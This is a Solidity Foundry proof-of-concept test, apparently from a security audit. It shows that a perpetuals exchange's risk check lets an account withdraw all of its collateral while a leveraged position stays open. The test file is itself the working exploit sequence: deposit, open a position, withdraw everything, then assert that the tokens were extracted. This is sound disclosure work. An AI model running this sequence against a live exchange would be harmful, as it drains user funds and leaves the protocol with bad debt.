// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./TransactionProcessor.basic.t.sol";
import "forge-std/console.sol";

/// @title PoC: Maintenance-margin bypass — withdraw 100% collateral while holding an open position
/// @notice Risk.checkValidTransition only enforces the "value must not decrease" rule when
/// initRisk == 0 (Risk.sol:136). Any account holding a position (risk > 0) can therefore remove
/// collateral down to zero — the ratio guard at Risk.sol:133 is inverted and never blocks a
/// risk-constant, value-decreasing transition. A perp user can deposit margin, open a leveraged
/// position, then withdraw ALL of their collateral out of the exchange, leaving an under-margined
/// (liquidatable) position with no backing => protocol bad debt.
contract PoC_MarginBypassWithdraw is TransactionProcessorTestBasic {
    using SyntheticPositionLib for uint256;

    function setUp() public override {
        TransactionProcessorTestBasic.setUp();
        // Owner of deployerUid already registered with OWNER_DEFAULT_PERMISSIONS (incl. ALLOW_WITHDRAW).
        deposit(deployerUid, 10_000); // collateral bucket 0 = 10_000
        setOraclePrice(); // price = 1 * FXP
        setFundingIndicesInfo(); // funding index = 0 (no accrual)
        // 2x risk factor: a position's risk is twice its mark value.
        setSyntheticAssetsInfo(synthAssetId, 10_000, 2 * FXP_32_ONE);
    }

    function _status() internal view returns (int256 value, int256 risk) {
        AccountPosition memory p = positionManager.getAccountPositionByUID(deployerUid);
        (value, risk) = riskContract.getAccountPositionStatus(p);
    }

    function test_PoC_withdrawAllCollateralWhileHoldingPosition() public {
        // ---- Open a leveraged position through the position pipeline ----
        vm.prank(deployer);
        positionManager.getOrCreatePosition(deployerUid, synthAssetId);
        vm.prank(deployer);
        positionManager.updatePositionInDict(deployerUid, 0, synthAssetId, 5_000); // long 5_000

        (int256 v0, int256 r0) = _status();
        // Healthy before withdrawal: risk <= value * FXP
        assertLe(r0, v0 * FXP_32_ONE, "precondition: account should start healthy");
        assertEq(
            positionManager.getCollateralBalanceByAccountId(deployerUid), 10_000, "collateral starts at 10_000"
        );

        uint256 tokenBefore = testToken.balanceOf(deployer);

        // ---- Withdraw 100% of collateral via the normal signed-tx pipeline ----
        Withdrawal memory w = createWithdrawal(deployerUid, deployer, 10_000, 0, PRIVATE_KEY);
        bytes[] memory txs = new bytes[](1);
        txs[0] = getMessage(TYPE_WITHDRAWAL, abi.encode(w));
        executeMultiTransactions(txs); // <-- should revert in a correct margin system; it does NOT

        // ---- L2: collateral fully drained, real tokens left the exchange ----
        assertEq(
            positionManager.getCollateralBalanceByAccountId(deployerUid), 0, "collateral drained to 0"
        );
        uint256 tokenAfter = testToken.balanceOf(deployer);
        assertEq(tokenAfter - tokenBefore, 10_000, "attacker received 10_000 tokens out of custody");

        // ---- L3: position still open and now UNDER maintenance margin (risk > value*FXP) ----
        AccountPosition memory p = positionManager.getAccountPositionByUID(deployerUid);
        assertEq(p.assets.length, 1, "position still open");
        assertEq(p.assets[0].amount, 5_000, "still long 5_000 with zero margin");
        (int256 v1, int256 r1) = _status();
        assertGt(r1, v1 * FXP_32_ONE, "BUG: account is now under maintenance margin yet withdrawal succeeded");

        console.log("value before (FXP):", v0);
        console.log("value after  (FXP):", v1);
        console.log("risk before (FXP^2):", r0);
        console.log("risk after  (FXP^2):", r1);
        console.log("tokens extracted:", tokenAfter - tokenBefore);
    }
}
